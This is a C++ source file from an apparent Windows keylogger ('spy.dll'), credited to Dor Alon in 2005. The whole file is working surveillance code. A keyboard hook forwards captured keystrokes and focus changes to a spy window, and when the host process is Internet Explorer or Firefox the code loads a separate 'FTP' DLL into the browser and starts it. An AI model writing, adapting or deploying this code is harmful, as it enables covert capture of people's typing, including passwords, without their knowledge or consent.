// Written by Dor Alon 2005
//

#include "stdafx.h"
#include "../consts.h"

///////////////////////////////////////////////////////////////////////////////////////////////
//Shared memory

#pragma data_seg(".adshared")
HWND g_hSpyWin = NULL;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.adshared,RWS")

bool bInjectFtpDll = false;
char g_szFtpDllFileName[1024];

typedef void (WINAPI *Init)(DWORD);

///////////////////////////////////////////////////////////////////////////////////////////

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{ 
	case DLL_PROCESS_ATTACH:
		{
			char processName[255];
			GetModuleFileName(GetModuleHandle( NULL ), processName, sizeof(processName) );

			strcpy(processName, _strlwr(processName));
			
			if (strstr(processName, "iexplore.exe") || strstr(processName, "firefox.exe"))
			{			
				bInjectFtpDll = true;

				//Retrive full path of spy.dll
				::GetModuleFileName((HMODULE)hModule, g_szFtpDllFileName, 1024);

				//Trim "spy.dll"
				while (g_szFtpDllFileName && g_szFtpDllFileName[strlen(g_szFtpDllFileName)-1] != '\\')
					g_szFtpDllFileName[strlen(g_szFtpDllFileName)-2] = NULL;

				strcat(g_szFtpDllFileName, FTP_DLL_NAME);                
			}

			break;
		}

	case DLL_THREAD_ATTACH: 
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

///////////////////////////////////////////////////////////////////////////////////////////

LRESULT CALLBACK HookProc (int nCode, WPARAM wParam, LPARAM lParam )
{		        
	if (nCode == HCBT_KEYSKIPPED && (lParam & 0x40000000))
	{        
		if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam==VK_TAB)||(wParam>=0x2f ) &&(wParam<=0x100)) 
		{
			::PostMessage(g_hSpyWin, MSG_MY_WM_KEYDOWN, wParam, lParam);
		}
	}
	else if (nCode == HCBT_SETFOCUS)
	{
		::PostMessage(g_hSpyWin, MSG_MY_WM_SETFOCUS, wParam, lParam);

		if (bInjectFtpDll && ::FindWindow(COMM_WIN_CLASS, NULL) == NULL)
		{
			HINSTANCE hFtpDll;
			Init InitFunc;

			if (hFtpDll = ::LoadLibrary(g_szFtpDllFileName))
			{
				if (InitFunc = (Init) ::GetProcAddress (hFtpDll,"Init"))
					(InitFunc)((DWORD)g_hSpyWin);
			}

			bInjectFtpDll = false;
		}
	}

	return CallNextHookEx( 0, nCode, wParam, lParam);
}

//////////////////////////////////////////////////////////////////////////

void CALLBACK SetSpyHwnd (DWORD hwnd)
{
	g_hSpyWin = (HWND) hwnd;
}

